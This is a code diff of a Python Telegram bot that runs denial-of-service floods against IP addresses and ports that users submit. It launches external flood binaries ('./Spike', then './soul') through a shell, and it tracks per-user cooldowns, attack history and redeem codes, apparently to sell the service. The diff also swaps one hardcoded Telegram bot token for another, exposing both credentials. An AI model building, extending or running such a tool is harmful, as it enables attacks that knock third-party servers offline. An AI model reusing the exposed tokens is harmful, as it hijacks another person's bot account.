@@ -3,6 +3,7 @@ import socket
 import subprocess
 import asyncio
 import pytz
+import logging
 import platform
 import random
 import string
@@ -20,12 +21,20 @@ settings_collection = db['settings0']  # A new collection to store global settin
 redeem_codes_collection = db['redeem_codes0']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7794130580:AAHEpNvfKmjRtsTi_2xapJIDd2dK2-mHo_g'
+TELEGRAM_BOT_TOKEN = '7738784595:AAEKNJG7gBY_LYURmmApdjRJxob9O3QPaOE'
 ADMIN_USER_ID = 5134043595  # Replace with your admin user ID
 
 # Cooldown dictionary and user attack history
 cooldown_dict = {}
 user_attack_history = {}
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Example log messages
+logging.info("Bot has started")
+logging.warning("This is a warning message")
+logging.error("An error occurred")
 
 # Valid IP prefixes
 valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
@@ -204,7 +213,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 1024 400",
+            f"./soul {ip} {port} {duration} 200",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
